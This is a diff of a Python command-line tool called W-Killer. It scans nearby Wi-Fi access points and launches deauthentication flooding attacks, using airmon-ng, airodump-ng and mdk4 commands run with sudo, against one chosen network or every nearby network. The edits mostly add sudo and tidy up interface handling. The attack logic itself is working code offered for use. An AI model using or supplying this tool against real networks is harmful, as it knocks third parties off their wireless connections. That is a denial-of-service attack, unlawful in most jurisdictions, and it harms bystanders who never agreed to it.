@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-from subprocess import Popen, PIPE, STDOUT
-from scapy.all import (Dot11,RadioTap,Dot11Deauth,sendp,send)
+from subprocess import Popen
 
 import os
 import csv
@@ -27,8 +26,6 @@ LIGHTMAGENTA = '\033[35m'
 WHITE = '\033[97m'
 GRAY = '\033[30m'
 
-banned_interfaces = ['eth','eth0','eth1','eth2','lo','lo0','lo1','lo2']
-
 home = os.path.expanduser('~')
 scanned_path = home+'/w-killer/scanned'
 DN = open(os.devnull, 'w')
@@ -36,7 +33,6 @@ commands = []
 
 if not os.path.exists(scanned_path):
     os.makedirs(scanned_path)
-
 
 os.chdir(scanned_path)
 os.system('clear')
@@ -63,30 +59,29 @@ def is_root():
     return os.geteuid() == 0
 
 def quitGracefully(clear=True):
+    print(f"\n{LIGHTGRAY}Thank you for using {CYAN}W{LIGHTGRAY}-{LIGHTBLUE}Killer{LIGHTGRAY}.\n")
     try:
         if clear == True:
             os.system('clear')
         os.system('stty sane') # unfreeze terminal
-        print(f'\n{LIGHTGRAY}Thank you for using {CYAN}W{LIGHTGRAY}-{LIGHTBLUE}Killer{LIGHTGRAY}.\n'\
-        f'{LIGHTORANGE}* {LIGHTGRAY}Stopping monitoring interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY})')
-        cmd = ['airmon-ng','stop',monitor_interface]
-        proc_restore = Popen(cmd, stdout=DN, stderr=DN)
-        proc_restore.communicate()
-        while proc_restore.wait == 1:
-            continue
-        proc_restore.kill()
+        if (monitor_interface):
+            print(f"{LIGHTORANGE}* {LIGHTGRAY}Stopping monitoring interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY})")
+            cmd = ['sudo', 'airmon-ng','stop',monitor_interface]
+            proc_restore = Popen(cmd, stdout=DN, stderr=DN)
+            proc_restore.communicate()
+            while proc_restore.wait == 1:
+                continue
+            proc_restore.kill()
 
         print(f'{LIGHTORANGE}* {LIGHTGRAY}Restarting {LIGHTORANGE}NetworkManager{LIGHTGRAY}')
-        cmd = ['service','NetworkManager','restart']
+        cmd = ['sudo', 'service','NetworkManager','restart']
         proc_restore = Popen(cmd, stdout=DN, stderr=DN)
         proc_restore.communicate()
         while proc_restore.wait == 1:
             continue
         proc_restore.kill()
-    except KeyboardInterrupt:
-        pass
     except:
-        print(f'\n{LIGHTGRAY}Thank you for using {CYAN}W{LIGHTGRAY}-{LIGHTBLUE}Killer{LIGHTGRAY}.')
+        pass
     print(f"{LIGHTGRAY}Don't forget to {GREEN}like {LIGHTGRAY}the repos on {CYAN}github {LIGHTGRAY}! :)")
     print(f"{LIGHTBLUE}* {GREEN}https://github.com/ZKAW/wifi-deauther")
     print(f'{LIGHTORANGE}Goodbye{LIGHTGRAY}.')
@@ -94,7 +89,7 @@ def quitGracefully(clear=True):
 
 
 def selectInterface():
-    os.system('airmon-ng check kill') # disable if not working properly
+    os.system('sudo airmon-ng check kill') # disable if not working properly
     while True:
         try:
             os.system('clear')
@@ -105,7 +100,7 @@ def selectInterface():
             interface_list = []
             count = -1
             for i in os.listdir("/sys/class/net/"):
-                if i not in banned_interfaces:
+                if not i.startswith('eth') and not i.startswith('lo'):
                     count += 1
                     interface_list.append(i)
                     if i.find('mon') != -1:
@@ -117,24 +112,24 @@ def selectInterface():
             os.system('clear')
             print(f"\n  {CYAN}* {LIGHTGRAY}You selected {LIGHTORANGE}{interface}{LIGHTGRAY} for monitoring, waiting for monitor mode to enable...")
             for i in os.listdir("/sys/class/net/"):
-                if i not in banned_interfaces:
+                if not i.startswith('eth') and not i.startswith('lo'):
                     if i.find('mon') != -1:
                         if i.find(interface) != -1:
                             monitor_interface = i
                             print(f"  {CYAN}* {LIGHTGRAY}Monitor interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY}) was already {GREEN}enabled{LIGHTGRAY}\n")
                             time.sleep(2)
                             break
-                        
+
             if monitor_interface == None:
                 try:
-                    cmd = ['airmon-ng','start',interface]
+                    cmd = ['sudo', 'airmon-ng','start',interface]
                     proc_dump = Popen(cmd, stdout=DN, stderr=DN)
                     proc_dump.communicate()
                     while proc_dump.wait == 1:
                         continue
                     proc_dump.kill()
                     for i in os.listdir("/sys/class/net/"):
-                        if i not in banned_interfaces:
+                        if not i.startswith('eth') and not i.startswith('lo'):
                             if i.find('mon') != -1:
                                 if i.find(interface) != -1:
                                     monitor_interface = i
@@ -163,7 +158,7 @@ def selectInterface():
 
 
 def scanAP(monitor_interface):
-    cmd = ['airodump-ng',monitor_interface,'-w','scanned','--output-format','csv']
+    cmd = ['sudo', 'airodump-ng', monitor_interface, '-w', 'scanned', '--output-format', 'csv']
     for i in os.listdir(scanned_path):
         if 'scanned' in i:
             os.remove(i)
@@ -171,7 +166,7 @@ def scanAP(monitor_interface):
 
     while os.path.exists(scanned_path+"/scanned-01.csv") == False:
         continue
-    
+
     attempts_count = 0
     while True:
         try:
@@ -220,7 +215,7 @@ def scanAP(monitor_interface):
                             output_clients += f"   {LIGHTGRAY}[{LIGHTORANGE}{count}{LIGHTGRAY}] {BLUE}{ssid.ljust(20)} {CYAN}{channel.rjust(3)}  {LIGHTORANGE}{enc.ljust(4)} {CYAN}{power.rjust(4)}    {BLUE}{bssid.ljust(10)}{LIGHTGRAY}\n"
                         else:
                             output_clients += f"   {LIGHTGRAY}[{LIGHTORANGE}{count}{LIGHTGRAY}] {BLUE}{ssid[0:17]}... {CYAN}{channel.rjust(3)}  {LIGHTORANGE}{enc.ljust(4)} {CYAN}{power.rjust(4)}    {BLUE}{bssid.ljust(10)}{LIGHTGRAY}\n"
-                        
+
                         bssid_list.append(bssid)
                         ssid_list.append(ssid)
                         channel_list.append(channel)
@@ -283,14 +278,14 @@ def selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list):
 
 def deauthAP(bssid, ssid, channel, monitor_interface):
     try:
-        os.system('airmon-ng check kill') # enable if not working properly
+        os.system('sudo airmon-ng check kill') # enable if not working properly
         os.system('clear')
         print(f'{LIGHTGRAY}Starting {LIGHTORANGE}deauth {LIGHTGRAY}attack for {BLUE}{ssid} {LIGHTGRAY}({CYAN}{bssid}{LIGHTGRAY})'\
               f' on channel {CYAN}{channel}{LIGHTGRAY}')
         print(f'{LIGHTGRAY}Press {LIGHTORANGE}CTRL+C {LIGHTGRAY}to {RED}STOP{LIGHTGRAY}\n')
         print(f'{CYAN}* {LIGHTGRAY}Flooding {CYAN}{bssid} {LIGHTGRAY}on channel {CYAN}{channel} {LIGHTGRAY}of {LIGHTORANGE}deauth {LIGHTGRAY}packets')
 
-        cmd = f'mdk4 {monitor_interface} d -c {channel} -B {bssid}'
+        cmd = f"sudo mdk4 {monitor_interface} d -c {channel} -B {bssid}"
         os.popen(cmd).read()
     except KeyboardInterrupt:
         quitGracefully()
@@ -298,13 +293,13 @@ def deauthAP(bssid, ssid, channel, monitor_interface):
 
 def deauthAll():
     try:
-        os.system('airmon-ng check kill') # enable if not working properly
+        os.system('sudo airmon-ng check kill') # enable if not working properly
         os.system('clear')
         print(f'{LIGHTGRAY}Starting {LIGHTORANGE}deauth {LIGHTGRAY}attack for {CYAN}every {LIGHTGRAY}nearby {BLUE}APs{LIGHTGRAY}')
         print(f'{LIGHTGRAY}Press {LIGHTORANGE}CTRL+C {LIGHTGRAY}to {RED}STOP{LIGHTGRAY}\n')
         print(f'{CYAN}* {LIGHTGRAY}Flooding {CYAN}all {LIGHTGRAY}channels {LIGHTGRAY}of {LIGHTORANGE}deauth {LIGHTGRAY}packets')
 
-        cmd = f'mdk4 {monitor_interface} d'
+        cmd = f"sudo mdk4 {monitor_interface} d"
         os.popen(cmd).read()
     except KeyboardInterrupt:
         quitGracefully()
@@ -317,6 +312,9 @@ try:
         print(f"{RED}* {LIGHTGRAY}Please try again with {ORANGE}sudo{LIGHTGRAY}")
         quitGracefully(clear=False)
     monitor_interface = selectInterface()
+    if monitor_interface == None:
+        print(f"{RED}* {LIGHTGRAY}Couldn't set {CYAN}monitoring interface{LIGHTGRAY}, please {ORANGE}check {LIGHTGRAY}your {ORANGE}wifi {LIGHTGRAY}card {ORANGE}state {LIGHTGRAY}and try again")
+        quitGracefully(clear=False)
     scanAP(monitor_interface)
 except Exception as e:
     print(f'\n{LIGHTGRAY}Following {RED}error {LIGHTGRAY}happened: {str(e)}\n')
